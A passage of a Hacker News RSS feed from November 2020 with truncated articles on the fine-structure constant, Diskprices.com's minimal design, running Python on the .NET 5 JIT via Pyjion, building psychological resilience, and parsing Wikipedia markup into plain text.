mechanics by the French physicist Paul Dirac, and then in what the English astronomer Arthur Eddington hoped would be a Theory of Everything. He planned to merge quantum theory and relativity to derive the properties of the universe such as the number of elementary particles in it, and its constants, α among them.</p><p>One twist in Eddington’s approach was that he considered the quantity 1/α rather than α, because his analysis showed that it must be an integer as well as a pure number. This was consistent with a contemporary measurement that yielded 1/α = 137.1, tantalizingly near 137 exactly. Eddington’s calculations gave instead 136, close enough to raise interest. Further measurements however confirmed that 1/α = 137.036. Eddington’s attempts to justify his different result were unconvincing and for this and other reasons his theory has not survived.</p><p>But α and “137” remain linked, which is why Richard Feynman called 137 a “magic number.” What he meant has nothing to do with numerology. Rather it is that we know how to measure the value of α but not how to derive it from any theories we know. This is true also for the other fundamental constants, including pure numbers such as the ratio of the proton and electron masses, and is a lack in the Standard Model. Nevertheless, the value of α is critical in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/issue/93/forerunners/a-supermassive-lens-on-the-constants-of-nature">http://m.nautil.us/issue/93/forerunners/a-supermassive-lens-on-the-constants-of-nature</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/issue/93/forerunners/a-supermassive-lens-on-the-constants-of-nature</link>
            <guid isPermaLink="false">hacker-news-small-sites-25235211</guid>
            <pubDate>Sat, 28 Nov 2020 04:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Design of Diskprices.com]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25235018">thread link</a>) | @neilpanchal
<br/>
November 27, 2020 | https://neil.computer/notes/the-design-of-diskprices-com/ | <a href="https://web.archive.org/web/*/https://neil.computer/notes/the-design-of-diskprices-com/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
        
        <p>I was browsing the interwebs and came across this beauty: <a href="https://diskprices.com/">https://diskprices.com/</a></p><figure><img src="https://neil.computer/content/images/2020/11/Screen-Shot-2020-11-27-at-7.15.01-PM.png" alt="Diskprices.com" srcset="https://neil.computer/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-7.15.01-PM.png 600w, https://neil.computer/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-7.15.01-PM.png 1000w, https://neil.computer/content/images/size/w1600/2020/11/Screen-Shot-2020-11-27-at-7.15.01-PM.png 1600w, https://neil.computer/content/images/size/w2400/2020/11/Screen-Shot-2020-11-27-at-7.15.01-PM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Diskprices.com</figcaption></figure><p>There is a distinct absense of a header, branding, anything that takes away screen real-estate. The design of Diskprices.com orients towards what the user came to the website to do - to look at the list of available harddrives and compare their prices. It's in the domain name!</p><p>Furthermore, the performance of this website is stellar. It loads almost instantly. And the list (although its not sortable) gets the job done, it is sorted by price already which is the most important attribute.</p><p>Diskprices.com deserves the UI/UX award of the decade. We've lost our ability to design user interfaces laser focused towards the <em>user</em>. Instead, we have purple gradients, scroll jacking, responsive bullshit, emojis, animations and many other things designers do today. The utilitarian approach of Diskprices.com is refreshing, although the contemporary designers cast it off as 'brutalist design', thereby marking it as a statement of fashion.</p><p>The creators of Diskprices.com didn't just do this by chance, it is a deliberate attempt as stated in the FAQ:</p><figure><img src="https://neil.computer/content/images/2020/11/Screen-Shot-2020-11-27-at-7.24.17-PM.png" alt="Diskprices.com FAQ" srcset="https://neil.computer/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-7.24.17-PM.png 600w, https://neil.computer/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-7.24.17-PM.png 1000w, https://neil.computer/content/images/2020/11/Screen-Shot-2020-11-27-at-7.24.17-PM.png 1210w" sizes="(min-width: 720px) 720px"><figcaption>Diskprices.com FAQ</figcaption></figure><p>Quoting:</p><blockquote>Do you need a graphic designer?<br>No. This site is designed to maximize information density, accessibility, and performance. More whitespace, colors, and icons won't help.</blockquote><p>If the design of the object, service or product is to enable the user, why is it shameful to keep it undecorated?</p><p>Folks at Diskprices.com, if you're reading this, beer is on me if we ever meet.</p>
        </article>
</div></div>]]>
            </description>
            <link>https://neil.computer/notes/the-design-of-diskprices-com/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25235018</guid>
            <pubDate>Sat, 28 Nov 2020 03:31:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Python on .NET 5]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25234986">thread link</a>) | @gilad
<br/>
November 27, 2020 | https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html | <a href="https://web.archive.org/web/*/https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <p><em>This post is an update on the Pyjion project to plug the .NET 5 CLR JIT compiler into Python 3.9.</em></p>
<p>.NET 5 was released on November 10, 2020. It is the cross-platform and open-source replacement of the <a href="https://github.com/dotnet/core"><strong>.NET Core</strong></a> project and the <strong>.NET</strong> project that ran exclusively on Windows since the late 90’s.</p>
<p>.NET is formed of many components:</p>
<ul>
<li>3 builtin languages, C#, F# and VB.NET, each with its own compiler</li>
<li>A standard library</li>
<li>A common intermediate language to abstract the high level languages from the core runtime. This is a standard known as <a href="https://github.com/tonybaloney/ecma-335/tree/master/docs">ECMA 335 CIL</a>.</li>
<li>A common language runtime (CLR) that compiles CIL into native machine code so that it can be executed and packages executables into .exe formats.</li>
</ul>
<p><img alt=".NET architecture" src="https://tonybaloney.github.io/img/posts/Common_Language_Infrastructure.png"></p>
<p>.NET 5 CLR comes bundled with a performant JIT compiler (codenamed RyuJIT) that will compile .NETs CIL into native machine instructions on Intel x86, x86-64, and ARM CPU architectures.</p>
<p>You can write code in a number of languages, like C++, C#, F# and compile those into CIL and then into native machine code (as a binary executable) on macOS, Linux, and Windows. Pretty neat.</p>
<p>But this is a blog about Python. So what does this have to do with Python?</p>
<p>Pyjion is a project to replace the core execution loop of CPython by transpiling CPython bytecode to ECMA CIL and then using the .NET 5 CLR to compile that into machine code. It then executes the machine-code compiled JIT frames at runtime instead of using the native execution loop of CPython.</p>
<h2>Very-quick overview of Python’s compiler</h2>
<p>When CPython compiles Python code, it compiles it into an intermediate format, similar to .NET, called Python bytecode. This bytecode is cached on disk so that when you import a module that hasn’t changed, it doesn’t compile it every time. You can see the bytecode by disassembling any Python function:</p>
<pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; def half(x):
...    return x/2
... 
&gt;&gt;&gt; dis.dis(half)
  2           0 LOAD_FAST                0 (x)
              2 LOAD_CONST               1 (2)
              4 BINARY_TRUE_DIVIDE
              6 RETURN_VALUE
</code></pre>

<p>To execute anything on a CPU, you have to provide the OS with machine-code instructions. This can be accomplished by compiling them up-front using a compiled like the C or C++ compilers. They compile code into executable formats as either shared libraries or standalone executables. <a href="https://tonybaloney.github.io/posts/extending-python-with-assembly.html"><em>See my post on Python/assembly for a bit more info on this topic</em></a>.</p>
<p>CPython converts the bytecode into machine code instructions like looping over them in a precompiled function, called the evaluation loop. This is essentially a big for loop with a switch statement. The compiled version of CPython that you’re running already has the instructions required. This is why CPython’s evaluation loop is an “AOT”, or “Ahead of Time” compiled library:</p>
<p><img alt="diagram 1" src="https://tonybaloney.github.io/img/posts/Slide1.png"></p>
<p><strong>Note: There is a lot more to CPython’s compiler. I’ve written a <a href="https://realpython.com/products/cpython-internals-book/">whole book on the CPython compiler and the internals of CPython</a> if you want to learn more.</strong></p>
<p>There are a few issues with this approach. The biggest is speed. A series of inline machine-code instructions is very performant. CPython has to make judgements at runtime for which code branch to follow every time your function is run. This leads to CPython being 100x slower in “tight-loop” problems where its executing the same thing again and again. The machine-code is compiled ahead of time and it has to loop around to get to the right instructions. Checkout my PyCon talk for a more in-depth explanation:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/I4nkgJdVZFA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>The most common way around this performance barrier is to compile Python extensions from C. This produces a custom binary with inline machine-code instructions for the task at hand. This is how most machine-learning and data science libraries like numpy, pandas, SKL are put together. This approach is still AOT compiling the code. It also requires a lot of knowledge of C. This approach has worked really well for the data science community, where algorithms can be performant and leverage low-level platforms <a href="https://numba.pydata.org/numba-doc/latest/cuda/index.html">like GPUs or specialised AI chipsets</a>.</p>
<p>There are a few issues with the AOT extension module approach. One is that it still uses the evaluation loop. C extension modules are a set of functions. Once you call the C-compiled function, its in the performant code, but your Python code that’s calling it still lives inside Python’s loop. If you want to leverage a compiled library and your Python code is doing some heavy number crunching, you end up having to use an API of functions, like numpy, instead of a more fluent Python API:</p>
<pre><code>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; a = np.ones([9, 5, 7, 4])
&gt;&gt;&gt; c = np.ones([9, 5, 4, 3])
&gt;&gt;&gt; np.dot(a, c).shape
(9, 5, 7, 9, 5, 3)
&gt;&gt;&gt; np.matmul(a, c).shape
(9, 5, 7, 3)
</code></pre>

<h2>What Pyjion does to solve this issue</h2>
<p>A few releases of Python ago (CPython specifically, the most commonly used version of Python) in 3.7 a new API was added to be able to swap out “frame execution” with a replacement implementation. This is otherwise known as <a href="https://www.python.org/dev/peps/pep-0523/">PEP 523</a>. PEP 523 also added the capability to store additional attributes in <em>code objects</em> (compiled Python code.</p>
<p>Pyjion does not compile Python code. It compiles Python frames (code objects, like blocks, functions, methods, classes) into machine-code at runtime using a performant JIT:</p>
<p><img alt="diagram 2" src="https://tonybaloney.github.io/img/posts/Slide2.png"></p>
<p>CPython compiles the Python code, so whatever language features and behaviours there are in CPython 3.9, like the walrus operator, <a href="https://www.python.org/dev/peps/pep-0584">the dictionary union operator</a>, will all work exactly the same with this extension enabled. This also means that this extension uses the same standard library as Python 3.9.</p>
<p>Pyjion is a “pip installable” package for standard CPython that JIT compiles all Python code at runtime using the .NET 5 JIT compiler. You can use off-the-shelf CPython 3.9 on macOS, Linux or Windows. After installing this package you just import the module and enable the JIT.</p>
<p>Once a frame has been compiled, the binary code is cached in memory and reused every time the function is called:</p>
<p><img alt="diagram 3" src="https://tonybaloney.github.io/img/posts/Slide3.png"></p>
<h2>Using Pyjion</h2>
<p>To get started, you need to have .NET 5 installed, with Python 3.9 and the Pyjion package (I also recommend using a virtual environment).</p>
<p>After importing pyjion, enable it by calling <code>pyjion.enable()</code> which sets a compilation threshold to 0 (the code only needs to be run once to be compiled by the JIT):</p>
<pre><code>&gt;&gt;&gt; import pyjion
&gt;&gt;&gt; pyjion.enable()
</code></pre>

<p>Any Python code you define or import after enabling pyjion will be JIT compiled. You don’t need to execute functions in any special API, its completely transparent:</p>
<pre><code>&gt;&gt;&gt; def half(x):
...    return x/2
&gt;&gt;&gt; half(2)
1.0
</code></pre>

<p>Pyjion will have compiled the <code>half</code> function into machine code on-the-fly and stored a cached version of that compiled function inside the function object.
You can see some basic stats by running <code>pyjion.info(f)</code>, where <code>f</code> is the function object:</p>
<pre><code>&gt;&gt;&gt; pyjion.info(half)
{'failed': False, 'compiled': True, 'run_count': 1}
</code></pre>

<p>You can see the machine code for the compiled function by disassembling it in the Python REPL.
Pyjion has essentially compiled your small Python function into a small, standalone application.
Install <code>distorm3</code> first to disassemble x86-64 assembly and run <code>pyjion.dis.dis_native(f)</code>:</p>
<pre><code>&gt;&gt;&gt; import pyjion.dis
&gt;&gt;&gt; pyjion.dis.dis_native(half)
00000000: PUSH RBP
00000001: MOV RBP, RSP
00000004: PUSH R14
00000006: PUSH RBX
00000007: MOV RBX, RSI
0000000a: MOV R14, [RDI+0x40]
0000000e: CALL 0x1b34
00000013: CMP DWORD [RAX+0x30], 0x0
00000017: JZ 0x31
00000019: CMP QWORD [RAX+0x40], 0x0
0000001e: JZ 0x31
00000020: MOV RDI, RAX
00000023: MOV RSI, RBX
00000026: XOR EDX, EDX
00000028: POP RBX
00000029: POP R14
...
</code></pre>

<p>The complex logic of converting a portable instruction set into low-level machine instructions is done by .NET’s CLR JIT compiler.</p>
<p>All Python code executed after the JIT is enabled will be compiled into native machine code at runtime and cached on disk. For example, to enable the JIT on a simple <code>app.py</code> for a Flask web app:</p>
<pre><code>import pyjion
pyjion.enable()

from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, World!'

app.run()
</code></pre>

<p>That’s it.</p>
<h2>Will this be compatible with my existing Python code? What about C Extensions?</h2>
<p>The short answer is- if your existing Python code runs on CPython 3.9 – <strong>yes</strong> it will be compatible. To make sure, Pyjion has been tested against the full CPython “test suite” on all platforms. In fact, it was the first JIT ever to pass the test suite.</p>
<p>Thats because this isn’t a Python runtime, it uses the existing Python compiler to compile your code into Python bytecode (low level instructions).</p>
<p>Pyjion uses the same dynamic module loader as CPython, so if you import a Python extension from your virtual environment, it will work just the same in Pyjion.</p>
<h2>Project History</h2>
<p>Pyjion isn’t new. Brett Cannon and Dino Viehland started the Pyjion project 4 years ago. This was the first JIT to pass the full CPython test suite.
There were some limitations to the original proof-of-concept:</p>
<ul>
<li>Written against an old version of .NET Core</li>
<li>Required custom patches of .NET and compiling from source</li>
<li>Required custom patches of CPython and compiling from source</li>
<li>Only worked on Windows</li>
<li>It was written for Python 3.6 before PEP 523 was agreed and merged</li>
</ul>
<p>Has much changed since Python 3.6? To the average user, not really. But under the hood, the implementation of a few things has completely changed:</p>
<ul>
<li>Function calls</li>
<li>Iterators</li>
<li>Exception Handling</li>
<li>Dictionary, list and set comprehensions</li>
<li>Generators and coroutines</li>
</ul>
<p>Actually, a <strong>lot</strong> has changed in the last few releases of CPython. The new fork to get Pyjion working with the latest version of everything was a big undertaking…</p>
<p><img alt="not-much-has-changed" src="https://tonybaloney.github.io/img/posts-original/not-much-has-changed.png"></p>
<p>The goal with the latest patch was to get the project up to the condition of:</p>
<ul>
<li>Using the release binaries of .NET 5 and CPython 3.9</li>
<li>Making it work across all platforms</li>
<li>Implement the PEP523 interface</li>
<li>Implement all the new features of Python 3.9</li>
<li>Making the package “pip installable” from PyPi</li>
<li>Improving the test coverage</li>
<li>Adding a disassembler (both machine-code and CIL) to aid development</li>
</ul>
<h2>Is this faster?</h2>
<p>The short answer a little, but not by much (yet).</p>
<p>JIT compiling something …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html">https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html</a></em></p>]]>
            </description>
            <link>https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25234986</guid>
            <pubDate>Sat, 28 Nov 2020 03:25:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Be Resilient]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25234941">thread link</a>) | @Brajeshwar
<br/>
November 27, 2020 | https://psyche.co/guides/resilience-is-like-a-muscle-build-it-up-when-life-pulls-down | <a href="https://web.archive.org/web/*/https://psyche.co/guides/resilience-is-like-a-muscle-build-it-up-when-life-pulls-down">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Adversity is everywhere. It can strike when youâ€™re least expecting it, and it might be accompanied by unpleasant, albeit normal, reactions such as anxiety, excessive worry, disappointment, grief, shame, frustration and sadness. Moving on from, and even growing through, a difficult or traumatic experience can be hard, but it <em>is</em> possible.</p>
<p>Iâ€™m sure youâ€™ve already heard, read or witnessed many inspiring stories of people who have bounced back from adversity, such as the death of a loved one, losing a job, serious physical illnesses, accidents, disasters or wars. But what should we do when weâ€™re faced with hardship ourselves? How will we deal with our pain? Can we prepare ourselves for this inevitable experience?</p>
<p>The answers to these questions are not straightforward, but the psychological concept of â€˜resilienceâ€™ can help. Given that weâ€™re all currently in the midst of an adverse situation â€“ the COVID-19 pandemic â€“ understanding resilience is especially pertinent. Resilience is defined as the ability to navigate successfully through, and recover from, stressful circumstances or crisis situations, and to do so in a way that leads to healthy functioning over time. That is, resilience is not only about bouncing back, but also about experiencing some sort of growth, such as finding meaning and purpose, self-awareness or experiencing improvement in interpersonal relationships.</p>
<p>Defining resilience might sound easy, but itâ€™s a more complex concept than you might think. First, many people display resilience immediately following exposure to a hardship or potentially traumatic event. And in the long term, most people who have gone through traumatic experiences donâ€™t show signs of depression or anxiety problems later in life. Consider the <a href="https://journals.sagepub.com/doi/10.1111/j.1467-9280.2006.01682.x" rel="nofollow noreferrer noopener">study</a> of New York residents in the wake of the terrorist attack of <span>11 September</span> 2001: the researchers found that <span>65 per cent</span> of those questioned had returned to their normal level of functioning within six months. You too might be capable of more resilience than you realise.</p>
<p>Second, although some people seem disposed to deal more effectively with stress and anxiety, and to better regulate their emotions, resilience is not a single trait that you either possess or you donâ€™t. Rather, itâ€™s a set of skills, including behaviours and thoughts that can be improved through learning and exposure to new experiences.</p>
<p>Third, although individual characteristics matter for resilience, <a href="https://pubmed.ncbi.nlm.nih.gov/11202047/" rel="nofollow noreferrer noopener">contextual</a> factors also have an influence, such as the social, health and economic resources available to you. For instance, you might be predisposed for resilience but, if you were brought up in an unsupportive and stressful environment by abusive parents, you might not develop it. In fact, as well as being inaccurate, it is unfair and harmful to see resilience purely as an individual trait â€“ people who struggle to recover from a negative life event might think that thereâ€™s something inherently wrong with them, which isnâ€™t true. Access to certain external resources is a major factor in anyoneâ€™s ability to display resilience.</p>
<p>Fourth, resilience is <a href="https://pubmed.ncbi.nlm.nih.gov/22559117/" rel="nofollow noreferrer noopener">dynamic</a>. You can be resilient in one context but then your capacity for resilience, or your ability to draw on available resources, might not be enough for another, possibly more demanding or difficult, situation. All of us can be more resilient at one stage in our lives but less so in another.</p>
<p>Fifth, being resilient doesnâ€™t mean that you wonâ€™t have a wound or a scar. For example, in one <a href="https://pubmed.ncbi.nlm.nih.gov/12416919/" rel="nofollow noreferrer noopener">study</a> of more than 200 people who had experienced the death of their spouse, even those identified as the most resilient reported having at least some grief symptoms. Almost everyone suffers some negative effects, such as emotional strain, throughout the journey of adversity but resilient individuals manage to recover well.</p>
<p>Lastly, it might sound paradoxical, but resilience comes from being in touch with adversity, not from trying to stay positive all the time, or from always running away from difficulties in life. Many of us are taught from an early age that we should avoid difficulties or stress, and itâ€™s true that toxic chronic stress is a <a href="https://pubmed.ncbi.nlm.nih.gov/27417486/" rel="nofollow noreferrer noopener">risk</a> factor for mental health problems. But exposure to some level of stress provides you with the necessary challenge to become stronger in the face of hardship, as long as you learn to cope successfully. By contrast, if youâ€™re overly avoidant of challenges in life then, when an unavoidable hardship arises, you wonâ€™t have developed the necessary skills to cope.</p>
<p>Understanding the complex, dynamic nature of resilience is important because it shows that there is no magic pill or a recipe that will make you resilient. Each individual will have their own way of coping with distress, their own pace of recovery, and levels of learning from a crisis. It is also totally fine to fail to recover quickly or entirely from a particular adversity. Itâ€™s okay to get hurt or lost during a difficult time.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Science doesnâ€™t have all the answers on how one becomes resilient, but what we do know is that it requires learning to tap into both inner and external resources. Iâ€™ll touch on some of the most fundamental ones.</p>
<p><strong>Connect with others</strong></p>
<p>During difficult times, it is common to want to withdraw from the world. This can be for varied reasons, such as feelings of shame, the fear of being judged, or not wishing to be a drain on others. Although there is nothing wrong with wanting solitude during difficult times, it is also important that you stay in touch with people, at least to an extent. <a href="https://pubmed.ncbi.nlm.nih.gov/12555794/" rel="nofollow noreferrer noopener">Research</a> shows that the risk of developing post-traumatic stress disorder is higher for people who lack post-trauma social support (bear in mind that, even if you have friends and family, if you avoid seeing or talking to them entirely, then it will be impossible for them to help you).</p>
<p>People who choose to connect with others and nurture their relationships, as opposed to isolating themselves, tend to become better at coping with a hardship and growing through their experience. The emotional and instrumental social support you get from your intimate relationships, and from your communities, can also give you the motivation to handle stress in a healthy way.</p>
<p>So, when difficulties are overwhelming, try reaching out to others who can provide support. There are a few different ways you could do this. One is simply by talking about what youâ€™re going through. It can be frustrating to talk to someone who just pretends that theyâ€™re listening or who is judgmental, so try to find someone who is accepting and good at listening. You could also try letting them know in advance that all you need is to be listened to. Another approach is to ask specifically for instrumental help, such as information, advice or help with daily tasks. More resilient people are usually aware that they canâ€™t solve every problem on their own. You might find it especially difficult to ask for help if youâ€™re used to handling problems on your own, or if you see relying on others as a sign of weakness. Try to remember that it takes courage to ask for help, and being in need simply means that youâ€™re human.</p>
<p>Here are a few more ideas for how to connect with others and get support: if you exercise or go for a walk, try inviting someone else along. Make a commitment to call or email loved ones regularly. Make use of the power of play â€“ laugh with friends or get silly. If there are social groups that share a common interest or hobby of yours, join them to exchange ideas or to get to know new people. Support others informally or through volunteer organisations; helping others makes us feel happy and valued.</p>
<p>Most importantly, donâ€™t wait for a disaster to occur to connect; make sure you have supportive relationships that nurture your sense of self-worth and need for intimacy, which in turn can contribute to resilience. If youâ€™re physically distant from your loved ones, look for ways to socially connect on a regular basis. Even the presence and support of a small number of people you can rely on can make a huge difference when adversity strikes.</p>
<p><strong>Accept and focus on what you can control</strong></p>
<p>About seven years ago, I was diagnosed with peripheral neuropathy, which is a type of nerve damage. For me, this chronic condition manifests itself as a constant sharp pain and burning sensation on my feet. My life was miserable for six months before the diagnosis, and the pain was unbearable. I could barely walk for five minutes at a time. Upon the diagnosis, I was prescribed medication that eased my pain. Although itâ€™s manageable now, the pain is always there, and Iâ€™ll probably be on medication for the rest of my life. For the first few months, I had difficulty accepting this. Back then, I <span>was 35</span> and had been physically very active before developing this illness. At least a hundred times I asked myself how it was possible. Rejecting and blaming myself, others or the world seemed to provide some relief but it didnâ€™t get me anywhere.</p>
<p>Then one day I decided to stop wrestling with my pain and to start acknowledging it. This didnâ€™t mean that I liked the situation â€“ I hated it â€“ but it provided me with the space to start being proactive and to find effective coping strategies. The more I accepted my situation and my pain, the less pain I felt. A <a href="https://pubmed.ncbi.nlm.nih.gov/16139188/" rel="nofollow noreferrer noopener">study</a> that involved experimentally inducing pain in <span>62 men and</span> women showed the effectiveness of acceptance â€“ those taught acceptance experienced less sensory pain compared with a control group who used simple distraction.</p>
<p>Note that acceptance is not about giving up or quitting. Itâ€™s about gently noticing whatâ€™s going on, and allowing unpleasant experiences to exist, without attempting to change or deny them. With acceptance, you can choose to do what really matters to you and follow your values more easily. In his <a href="https://stevenchayes.com/a-liberated-mind/" rel="nofollow noreferrer noopener">book</a> <em>A Liberated Mind</em> (2019), the American psychologist <a href="https://aeon.co/essays/how-to-live-a-values-driven-life-in-the-face-of-dark-emotions" rel="noopener">Steven Hayes</a>, the founder of <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3635495/" rel="nofollow noreferrer noopener">ACT</a> (acceptance and …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/resilience-is-like-a-muscle-build-it-up-when-life-pulls-down">https://psyche.co/guides/resilience-is-like-a-muscle-build-it-up-when-life-pulls-down</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/resilience-is-like-a-muscle-build-it-up-when-life-pulls-down</link>
            <guid isPermaLink="false">hacker-news-small-sites-25234941</guid>
            <pubDate>Sat, 28 Nov 2020 03:16:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Type Theory and Applications [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25234780">thread link</a>) | @azhenley
<br/>
November 27, 2020 | https://metatheorem.org/includes/pubs/comp.pdf | <a href="https://web.archive.org/web/*/https://metatheorem.org/includes/pubs/comp.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://metatheorem.org/includes/pubs/comp.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25234780</guid>
            <pubDate>Sat, 28 Nov 2020 02:47:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Link Between Curiosity and Creativity]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25234758">thread link</a>) | @dbustac
<br/>
November 27, 2020 | https://danielbusta.com/link/ | <a href="https://web.archive.org/web/*/https://danielbusta.com/link/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://danielbusta.com/link/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25234758</guid>
            <pubDate>Sat, 28 Nov 2020 02:44:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parsing All of Wikipedia to an Offline Encyclopedia]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25234490">thread link</a>) | @miles
<br/>
November 27, 2020 | https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html | <a href="https://web.archive.org/web/*/https://daveshap.github.io/DavidShapiroBlog/automation/2020/11/15/parsing-all-wikipedia.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
<div>

<header>
 
  <h2>I want an offline encyclopedia and am extremely masochistic</h2>
   <h3>15 November 2020</h3>
    <a href="https://daveshap.github.io/DavidShapiroBlog">Home</a>&nbsp;—&nbsp;
    <a href="https://daveshap.github.io/DavidShapiroBlog/categories.html">Categories</a>
</header>

<hr>

<section id="main_content">


<p>I’m working on a project where I want to have an offline encyclopedia. It’s for training deep learning networks so it needs to be in plain text English. 
No markup, no special characters. Human readable without any interpreters, renderers, or parsers. I’ve got plenty of disk space, so that’s not a concern. 
Once I parse out all the Wikipedia articles I can get my hands on, I will create an index. Or I might index them into SOLR or something like that. Not sure yet.
I’m also going to implement it as a resource for a massive <a href="https://towardsdatascience.com/building-a-question-answering-system-part-1-9388aadff507">SQUAD repo</a>. I have uploaded a copy of the final result to <a href="https://www.kaggle.com/ltcmdrdata/plain-text-wikipedia-202011">Kaggle Datasets</a>. I’ve stashed the script in a <a href="https://github.com/daveshap/PlainTextWikipedia">dedicated repo on GitHub</a>.</p>



<p>The first thing I should have learned is that Wikipedia is written in a demented Frankenstein language called WikeMedia Text. It’s a hybrid of HTML/XML and Markdown. 
It has no consistency and is the worst example of spaghetti code I’ve ever seen. I’m sure there are better implementations today, but I can see how and why it ended up the way it did.
For instance, you need to be able to create robust references and links, so the URL syntax is way jacked. It relies on a lot of procedural generation at display time.
Personally, if it were done again today, I think something like Jekyll would be way better. Instead of rendering again and again every time someone visits a page, render it once after each edit.
But that’s just me. So instead we’re left with this horrible hybrid language that should die in a fire.</p>

<p>Fine, it is what it is. I’m an expert automator, dammit, and if a machine can automatically render this nonsense, then I sure as hell can <strong>unrender it</strong>.</p>

<h2 id="attempt-1---brute-force-regex">Attempt 1 - Brute Force Regex</h2>

<p>“Brute Force Regex” (BFR) is not a real thing. It’s just something I’ve been doing for years now in my automation habits. Usually, as a naive approach, I’ll try and do some 
search-and-replace jiggery pokery to just remove unwanted junk. Sometimes this is textual formatting, like brackets around tables or other HTML tags. 
So I ended up with the following function. Caution, it’s not pretty. This was just an experiment, and I wanted to share it so you would see what doesn’t work.</p>

<div><div><pre><code><span>def</span> <span>basic_replacements</span><span>(</span><span>text</span><span>):</span>
    <span>replacements</span> <span>=</span> <span>[</span>
    <span>(</span><span>'&amp;lt;'</span><span>,</span><span>'&lt;'</span><span>),</span>
    <span>(</span><span>'&amp;gt;'</span><span>,</span><span>'&gt;'</span><span>),</span>
    <span>(</span><span>'&amp;quot;'</span><span>,</span><span>'"'</span><span>),</span>
    <span>(</span><span>"'''"</span><span>,</span><span>' = '</span><span>),</span>
    <span>(</span><span>"'{2,}"</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'</span><span>\n</span><span>'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>r'\n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'r</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'&lt;ref.*?&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'&lt;/ref&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'http.*?\s'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'\s+'</span><span>,</span><span>' '</span><span>),</span>
    <span>]</span>
    <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>)</span>
    <span>for</span> <span>r</span> <span>in</span> <span>replacements</span><span>:</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>r</span><span>[</span><span>0</span><span>],</span> <span>r</span><span>[</span><span>1</span><span>],</span> <span>text</span><span>)</span>
    <span>return</span> <span>text</span>
</code></pre></div></div>

<p>I came up with this scheme because, at first glance, WikiMedia Text looked like a mixture of some basic HTML and some Markdown. 
I figured I could handle it with some basic regex replacements. This worked… to an extent. There were a few problems with it though.</p>

<ol>
  <li>Couldn’t handle nested square brackets or curly brackets, and it turns out there are a lot of those</li>
  <li>Quickly became intractable when I encountered escaped unicode literals like <code>\u2013</code>. They are frigging everywhere.</li>
</ol>

<p>So I wrote two more functions to try and tackle the bracketed stuff. These are things like links, citations, and pictures. Since I want a text-only Wikipedia, 
I really just needed to strip it all away.</p>

